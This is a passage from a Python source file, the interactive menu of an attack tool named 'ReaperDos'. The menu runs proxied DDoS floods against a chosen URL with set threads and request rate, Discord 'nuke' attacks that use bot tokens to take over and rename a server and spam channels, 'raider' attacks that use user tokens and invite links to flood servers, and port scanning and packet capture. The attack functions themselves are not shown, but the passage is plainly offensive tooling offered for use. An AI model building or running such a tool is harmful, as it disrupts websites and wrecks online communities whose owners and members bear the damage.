            target = input(f"{Fore.GREEN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            threads = int(input(f"{Fore.GREEN}Enter number of threads: {Style.RESET_ALL}"))
            rate = int(input(f"{Fore.GREEN}Enter requests per second: {Style.RESET_ALL}"))
            await ddos_attack(proxy_manager, target, duration, attack_type="custom", threads=threads, rate=rate)
        
        elif choice == '4':  # Single Nuke Attack
            token = input(f"{Fore.GREEN}Enter Discord bot token: {Style.RESET_ALL}").strip()
            server_id = input(f"{Fore.GREEN}Enter server ID: {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            await nuke_attack(proxy_manager, token, server_id, duration)
        
        elif choice == '5':  # Multi Nuke Attack
            tokens = input(f"{Fore.GREEN}Enter Discord bot tokens (comma-separated): {Style.RESET_ALL}").split(',')
            server_id = input(f"{Fore.GREEN}Enter server ID: {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            await multi_nuke_attack(proxy_manager, [t.strip() for t in tokens], server_id, duration)
        
        elif choice == '6':  # Custom Nuke Attack
            token = input(f"{Fore.GREEN}Enter Discord bot token: {Style.RESET_ALL}").strip()
            server_id = input(f"{Fore.GREEN}Enter server ID: {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            server_name = input(f"{Fore.GREEN}Enter new server name: {Style.RESET_ALL}").strip()
            channel_name = input(f"{Fore.GREEN}Enter channel name prefix: {Style.RESET_ALL}").strip()
            message = input(f"{Fore.GREEN}Enter custom message: {Style.RESET_ALL}").strip()
            await custom_nuke_attack(proxy_manager, token, server_id, duration, server_name, channel_name, message)
        
        elif choice == '7':  # Geo Filter Attack
            target = input(f"{Fore.GREEN}Enter target IP: {Style.RESET_ALL}").strip()
            country_code = input(f"{Fore.GREEN}Enter country code (e.g., US): {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            geo_filter_attack(proxy_manager, target, country_code, duration)
        
        elif choice == '8':  # Config Attack
            config_file = input(f"{Fore.GREEN}Enter config file path: {Style.RESET_ALL}").strip()
            config_attack(proxy_manager, config_file)
        
        elif choice == '9':  # Exit
            print(f"{Fore.YELLOW}Exiting ReaperDos...{Style.RESET_ALL}")
            break
        
        elif choice == '10':  # Single Raider Attack
            token = input(f"{Fore.GREEN}Enter Discord user token: {Style.RESET_ALL}").strip()
            invite_link = input(f"{Fore.GREEN}Enter invite link: {Style.RESET_ALL}").strip()
            await raider_attack(proxy_manager, token, invite_link)
        
        elif choice == '11':  # Multi Raider Attack
            tokens = input(f"{Fore.GREEN}Enter Discord user tokens (comma-separated): {Style.RESET_ALL}").split(',')
            invite_link = input(f"{Fore.GREEN}Enter invite link: {Style.RESET_ALL}").strip()
            await multi_raider_attack(proxy_manager, [t.strip() for t in tokens], invite_link)
        
        elif choice == '12':  # Custom Raider Attack
            token = input(f"{Fore.GREEN}Enter Discord user token: {Style.RESET_ALL}").strip()
            invite_link = input(f"{Fore.GREEN}Enter invite link: {Style.RESET_ALL}").strip()
            message = input(f"{Fore.GREEN}Enter custom message: {Style.RESET_ALL}").strip()
            await custom_raider_attack(proxy_manager, token, invite_link, message)
        
        elif choice == '13':  # IP Lookup
            ip = input(f"{Fore.GREEN}Enter IP address: {Style.RESET_ALL}").strip()
            result = ip_lookup(ip)
            print(f"{Fore.YELLOW}IP Lookup Result: {result}{Style.RESET_ALL}")
        
        elif choice == '14':  # Port Scan
            target = input(f"{Fore.GREEN}Enter target IP or domain: {Style.RESET_ALL}").strip()
            ports = tuple(map(int, input(f"{Fore.GREEN}Enter ports to scan (comma-separated, e.g., 80,443,22): {Style.RESET_ALL}").split(',')))
            result = port_scan(target, ports)
            print(f"{Fore.YELLOW}Port Scan Result: {result}{Style.RESET_ALL}")
        
        elif choice == '15':  # Proxy Speed Test
            results = await proxy_speed_test(proxy_manager)
            print(f"{Fore.YELLOW}Proxy Speed Test Results: {results}{Style.RESET_ALL}")
        
        elif choice == '16':  # Packet Analysis
            interface = input(f"{Fore.GREEN}Enter network interface (e.g., eth0): {Style.RESET_ALL}").strip()
            count = int(input(f"{Fore.GREEN}Enter number of packets to capture: {Style.RESET_ALL}"))
            result = packet_analysis(interface, count)
            print(f"{Fore.YELLOW}Packet Analysis Result: {result}{Style.RESET_ALL}")
        
        elif choice == '17':  # View Logs
            view_logs()
        
        else:
            print(f"{Fore.RED}Invalid choice. Please enter a number between 1 and 17.{Style.RESET_ALL}")
        
        input(f"{Fore.YELLOW}Press Enter to return to the menu...{Style.RESET_ALL}")

if __name__ == "__main__":
    asyncio.run(main())
